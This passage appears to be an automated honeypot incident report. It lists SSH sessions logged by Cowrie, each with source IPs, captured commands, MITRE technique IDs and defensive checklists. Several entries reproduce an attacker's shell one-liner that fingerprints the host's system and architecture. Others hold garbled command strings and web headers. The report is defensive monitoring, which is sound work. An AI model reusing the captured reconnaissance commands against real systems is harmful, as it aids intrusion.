| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:25:22` | `cowrie.session.connect` |
| `2026-09-06 08:25:23` | `cowrie.client.version` |
| `2026-09-06 08:25:23` | `cowrie.client.kex` |
| `2026-09-06 08:25:26` | `cowrie.login.success` |
| `2026-09-06 08:25:28` | `cowrie.session.params` |
| `2026-09-06 08:25:28` | `cowrie.command.input` |
| `2026-09-06 08:25:30` | `cowrie.log.closed` |
| `2026-09-06 08:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f427c14ac3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:27 |
| **Last Seen** | 2026-09-06 08:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:27:35` | `cowrie.session.connect` |
| `2026-09-06 08:27:35` | `cowrie.client.version` |
| `2026-09-06 08:27:35` | `cowrie.client.kex` |
| `2026-09-06 08:27:38` | `cowrie.login.success` |
| `2026-09-06 08:27:40` | `cowrie.session.params` |
| `2026-09-06 08:27:40` | `cowrie.command.input` |
| `2026-09-06 08:27:40` | `cowrie.log.closed` |
| `2026-09-06 08:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e9a8736007

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:29 |
| **Last Seen** | 2026-09-06 08:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:29:41` | `cowrie.session.connect` |
| `2026-09-06 08:29:42` | `cowrie.client.version` |
| `2026-09-06 08:29:42` | `cowrie.client.kex` |
| `2026-09-06 08:29:44` | `cowrie.login.success` |
| `2026-09-06 08:29:45` | `cowrie.session.params` |
| `2026-09-06 08:29:45` | `cowrie.command.input` |
| `2026-09-06 08:29:46` | `cowrie.log.closed` |
| `2026-09-06 08:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159cec9e01ef

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]192` |
| **First Seen** | 2026-09-06 08:30 |
| **Last Seen** | 2026-09-06 08:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Electron/2.0.18 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:30:51` | `cowrie.session.connect` |
| `2026-09-06 08:30:51` | `cowrie.login.success` |
| `2026-09-06 08:30:51` | `cowrie.session.params` |
| `2026-09-06 08:30:51` | `cowrie.command.input` |
| `2026-09-06 08:30:51` | `cowrie.command.input` |
| `2026-09-06 08:30:51` | `cowrie.command.failed` |
| `2026-09-06 08:30:51` | `cowrie.command.input` |
| `2026-09-06 08:30:51` | `cowrie.command.failed` |
| `2026-09-06 08:30:51` | `cowrie.command.input` |
| `2026-09-06 08:30:51` | `cowrie.log.closed` |
| `2026-09-06 08:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]192` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2677a298fc7

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:31 |
| **Last Seen** | 2026-09-06 08:32 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:31:27` | `cowrie.session.connect` |
| `2026-09-06 08:31:28` | `cowrie.login.success` |
| `2026-09-06 08:31:29` | `cowrie.session.params` |
| `2026-09-06 08:31:29` | `cowrie.command.input` |
| `2026-09-06 08:31:29` | `cowrie.command.failed` |
| `2026-09-06 08:31:29` | `cowrie.command.input` |
| `2026-09-06 08:31:29` | `cowrie.command.failed` |
| `2026-09-06 08:31:30` | `cowrie.command.input` |
| `2026-09-06 08:31:30` | `cowrie.command.failed` |
| `2026-09-06 08:31:30` | `cowrie.command.input` |
| `2026-09-06 08:31:30` | `cowrie.command.failed` |
| `2026-09-06 08:31:31` | `cowrie.command.input` |
| `2026-09-06 08:31:31` | `cowrie.command.input` |
| `2026-09-06 08:31:31` | `cowrie.command.failed` |
| `2026-09-06 08:31:31` | `cowrie.command.failed` |
| `2026-09-06 08:32:01` | `cowrie.log.closed` |
| `2026-09-06 08:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de383bc123b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:31 |
| **Last Seen** | 2026-09-06 08:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:31:49` | `cowrie.session.connect` |
| `2026-09-06 08:31:49` | `cowrie.client.version` |
| `2026-09-06 08:31:49` | `cowrie.client.kex` |
| `2026-09-06 08:31:51` | `cowrie.login.success` |
| `2026-09-06 08:31:52` | `cowrie.session.params` |
| `2026-09-06 08:31:52` | `cowrie.command.input` |
| `2026-09-06 08:31:53` | `cowrie.log.closed` |
| `2026-09-06 08:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f37befe4f4b

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:32 |
| **Last Seen** | 2026-09-06 08:32 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:32:01` | `cowrie.session.connect` |
| `2026-09-06 08:32:02` | `cowrie.login.success` |
| `2026-09-06 08:32:03` | `cowrie.session.params` |
| `2026-09-06 08:32:03` | `cowrie.command.input` |
| `2026-09-06 08:32:03` | `cowrie.command.failed` |
| `2026-09-06 08:32:03` | `cowrie.command.input` |
| `2026-09-06 08:32:03` | `cowrie.command.failed` |
| `2026-09-06 08:32:04` | `cowrie.command.input` |
| `2026-09-06 08:32:04` | `cowrie.command.failed` |
| `2026-09-06 08:32:04` | `cowrie.command.input` |
| `2026-09-06 08:32:04` | `cowrie.command.failed` |
| `2026-09-06 08:32:05` | `cowrie.command.input` |
| `2026-09-06 08:32:05` | `cowrie.command.input` |
| `2026-09-06 08:32:05` | `cowrie.command.failed` |
| `2026-09-06 08:32:05` | `cowrie.command.failed` |
| `2026-09-06 08:32:35` | `cowrie.log.closed` |
| `2026-09-06 08:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b3581b3320

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:32 |
| **Last Seen** | 2026-09-06 08:33 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:32:35` | `cowrie.session.connect` |
| `2026-09-06 08:32:36` | `cowrie.login.success` |
| `2026-09-06 08:32:37` | `cowrie.login.success` |
| `2026-09-06 08:32:37` | `cowrie.session.params` |
| `2026-09-06 08:32:38` | `cowrie.command.input` |
| `2026-09-06 08:32:38` | `cowrie.command.failed` |
| `2026-09-06 08:32:38` | `cowrie.command.input` |
| `2026-09-06 08:32:38` | `cowrie.command.failed` |
| `2026-09-06 08:32:39` | `cowrie.command.input` |
| `2026-09-06 08:32:39` | `cowrie.command.input` |
| `2026-09-06 08:32:39` | `cowrie.command.failed` |
| `2026-09-06 08:32:39` | `cowrie.command.failed` |
| `2026-09-06 08:33:09` | `cowrie.log.closed` |
| `2026-09-06 08:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eadd98db9aa5

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:33 |
| **Last Seen** | 2026-09-06 08:33 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:33:09` | `cowrie.session.connect` |
| `2026-09-06 08:33:10` | `cowrie.login.success` |
| `2026-09-06 08:33:11` | `cowrie.login.success` |
| `2026-09-06 08:33:11` | `cowrie.session.params` |
| `2026-09-06 08:33:12` | `cowrie.command.input` |
| `2026-09-06 08:33:12` | `cowrie.command.failed` |
| `2026-09-06 08:33:12` | `cowrie.command.input` |
| `2026-09-06 08:33:12` | `cowrie.command.failed` |
| `2026-09-06 08:33:13` | `cowrie.command.input` |
| `2026-09-06 08:33:13` | `cowrie.command.input` |
| `2026-09-06 08:33:13` | `cowrie.command.failed` |
| `2026-09-06 08:33:13` | `cowrie.command.failed` |
| `2026-09-06 08:33:43` | `cowrie.log.closed` |
| `2026-09-06 08:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-121dffbde614

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:33 |
| **Last Seen** | 2026-09-06 08:34 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:33:43` | `cowrie.session.connect` |
| `2026-09-06 08:33:44` | `cowrie.login.success` |
| `2026-09-06 08:33:45` | `cowrie.login.success` |
| `2026-09-06 08:33:45` | `cowrie.session.params` |
| `2026-09-06 08:33:46` | `cowrie.command.input` |
| `2026-09-06 08:33:46` | `cowrie.command.failed` |
| `2026-09-06 08:33:46` | `cowrie.command.input` |
| `2026-09-06 08:33:46` | `cowrie.command.failed` |
| `2026-09-06 08:33:47` | `cowrie.command.input` |
| `2026-09-06 08:33:47` | `cowrie.command.input` |
| `2026-09-06 08:33:47` | `cowrie.command.failed` |
| `2026-09-06 08:33:47` | `cowrie.command.failed` |
| `2026-09-06 08:34:17` | `cowrie.log.closed` |
| `2026-09-06 08:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0643bcc6970d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:34 |
| **Last Seen** | 2026-09-06 08:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:34:08` | `cowrie.session.connect` |
| `2026-09-06 08:34:08` | `cowrie.client.version` |
| `2026-09-06 08:34:08` | `cowrie.client.kex` |
| `2026-09-06 08:34:10` | `cowrie.login.success` |
| `2026-09-06 08:34:11` | `cowrie.session.params` |
| `2026-09-06 08:34:11` | `cowrie.command.input` |
| `2026-09-06 08:34:12` | `cowrie.log.closed` |
| `2026-09-06 08:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371bbc40ed86

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:34 |
| **Last Seen** | 2026-09-06 08:34 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:34:17` | `cowrie.session.connect` |
| `2026-09-06 08:34:18` | `cowrie.login.success` |
| `2026-09-06 08:34:19` | `cowrie.login.success` |
| `2026-09-06 08:34:20` | `cowrie.session.params` |
| `2026-09-06 08:34:20` | `cowrie.command.input` |
| `2026-09-06 08:34:20` | `cowrie.command.failed` |
| `2026-09-06 08:34:20` | `cowrie.command.input` |
| `2026-09-06 08:34:20` | `cowrie.command.failed` |
| `2026-09-06 08:34:21` | `cowrie.command.input` |
| `2026-09-06 08:34:21` | `cowrie.command.input` |
| `2026-09-06 08:34:21` | `cowrie.command.failed` |
| `2026-09-06 08:34:21` | `cowrie.command.failed` |
| `2026-09-06 08:34:52` | `cowrie.log.closed` |
| `2026-09-06 08:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ee92bdfa30

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:34 |
| **Last Seen** | 2026-09-06 08:35 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:34:52` | `cowrie.session.connect` |
| `2026-09-06 08:34:53` | `cowrie.login.success` |
| `2026-09-06 08:34:54` | `cowrie.login.success` |
| `2026-09-06 08:34:54` | `cowrie.session.params` |
| `2026-09-06 08:34:55` | `cowrie.command.input` |
| `2026-09-06 08:34:55` | `cowrie.command.failed` |
| `2026-09-06 08:34:55` | `cowrie.command.input` |
| `2026-09-06 08:34:55` | `cowrie.command.failed` |
| `2026-09-06 08:34:56` | `cowrie.command.input` |
| `2026-09-06 08:34:56` | `cowrie.command.input` |
| `2026-09-06 08:34:56` | `cowrie.command.failed` |
| `2026-09-06 08:34:56` | `cowrie.command.failed` |
| `2026-09-06 08:35:26` | `cowrie.log.closed` |
| `2026-09-06 08:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-008760647769

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:35 |
| **Last Seen** | 2026-09-06 08:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:35:26` | `cowrie.session.connect` |
| `2026-09-06 08:35:27` | `cowrie.login.failed` |
| `2026-09-06 08:35:28` | `cowrie.login.success` |
| `2026-09-06 08:35:28` | `cowrie.session.params` |
| `2026-09-06 08:35:29` | `cowrie.command.input` |
| `2026-09-06 08:35:29` | `cowrie.command.failed` |
| `2026-09-06 08:35:29` | `cowrie.command.input` |
| `2026-09-06 08:35:29` | `cowrie.command.failed` |
| `2026-09-06 08:35:30` | `cowrie.command.input` |
| `2026-09-06 08:35:30` | `cowrie.command.input` |
| `2026-09-06 08:35:30` | `cowrie.command.failed` |
| `2026-09-06 08:35:30` | `cowrie.command.failed` |
| `2026-09-06 08:36:00` | `cowrie.log.closed` |
| `2026-09-06 08:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f177960286b

| Field | Detail |
|---|---|
| **Source IP** | `34.77.104[.]9` |
| **First Seen** | 2026-09-06 08:35 |
| **Last Seen** | 2026-09-06 08:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:35:34` | `cowrie.session.connect` |
| `2026-09-06 08:35:34` | `cowrie.login.success` |
| `2026-09-06 08:35:34` | `cowrie.session.params` |
| `2026-09-06 08:35:34` | `cowrie.command.input` |
| `2026-09-06 08:35:34` | `cowrie.command.input` |
| `2026-09-06 08:35:34` | `cowrie.command.failed` |
| `2026-09-06 08:35:34` | `cowrie.command.input` |
| `2026-09-06 08:35:34` | `cowrie.log.closed` |
| `2026-09-06 08:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.104[.]9` to AbuseIPDB if not already reported
- [ ] Block `34.77.104[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99b13cf93754

| Field | Detail |
|---|---|
| **Source IP** | `34.77.104[.]9` |
| **First Seen** | 2026-09-06 08:35 |
| **Last Seen** | 2026-09-06 08:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:35:47` | `cowrie.session.connect` |
| `2026-09-06 08:35:47` | `cowrie.login.success` |
| `2026-09-06 08:35:48` | `cowrie.session.params` |
| `2026-09-06 08:35:48` | `cowrie.command.input` |
| `2026-09-06 08:35:48` | `cowrie.command.failed` |
| `2026-09-06 08:35:59` | `cowrie.log.closed` |
| `2026-09-06 08:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.104[.]9` to AbuseIPDB if not already reported
- [ ] Block `34.77.104[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15bed303c5e7

| Field | Detail |
|---|---|
| **Source IP** | `34.77.104[.]9` |
| **First Seen** | 2026-09-06 08:35 |
| **Last Seen** | 2026-09-06 08:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:35:49` | `cowrie.session.connect` |
| `2026-09-06 08:35:49` | `cowrie.login.success` |
| `2026-09-06 08:35:50` | `cowrie.session.params` |
| `2026-09-06 08:35:50` | `cowrie.command.input` |
| `2026-09-06 08:35:59` | `cowrie.log.closed` |
| `2026-09-06 08:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.104[.]9` to AbuseIPDB if not already reported
- [ ] Block `34.77.104[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4457c54c7737

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:36 |
| **Last Seen** | 2026-09-06 08:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:36:00` | `cowrie.session.connect` |
| `2026-09-06 08:36:01` | `cowrie.login.success` |
| `2026-09-06 08:36:02` | `cowrie.session.params` |
| `2026-09-06 08:36:02` | `cowrie.command.input` |
| `2026-09-06 08:36:02` | `cowrie.command.failed` |
| `2026-09-06 08:36:02` | `cowrie.command.input` |
| `2026-09-06 08:36:02` | `cowrie.command.failed` |
| `2026-09-06 08:36:03` | `cowrie.command.input` |
| `2026-09-06 08:36:03` | `cowrie.command.failed` |
| `2026-09-06 08:36:03` | `cowrie.command.input` |
| `2026-09-06 08:36:03` | `cowrie.command.failed` |
| `2026-09-06 08:36:04` | `cowrie.command.input` |
| `2026-09-06 08:36:04` | `cowrie.command.input` |
| `2026-09-06 08:36:04` | `cowrie.command.failed` |
| `2026-09-06 08:36:04` | `cowrie.command.failed` |
| `2026-09-06 08:36:34` | `cowrie.log.closed` |
| `2026-09-06 08:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19f51a1f3517

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 08:36 |
| **Last Seen** | 2026-09-06 08:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 08:36:29` | `cowrie.session.connect` |
| `2026-09-06 08:36:30` | `cowrie.client.version` |
| `2026-09-06 08:36:30` | `cowrie.client.kex` |
| `2026-09-06 08:36:31` | `cowrie.login.success` |
| `2026-09-06 08:36:32` | `cowrie.session.params` |
| `2026-09-06 08:36:32` | `cowrie.command.input` |
| `2026-09-06 08:36:33` | `cowrie.log.closed` |
| `2026-09-06 08:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb2d8b173130

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-09-06 08:36 |
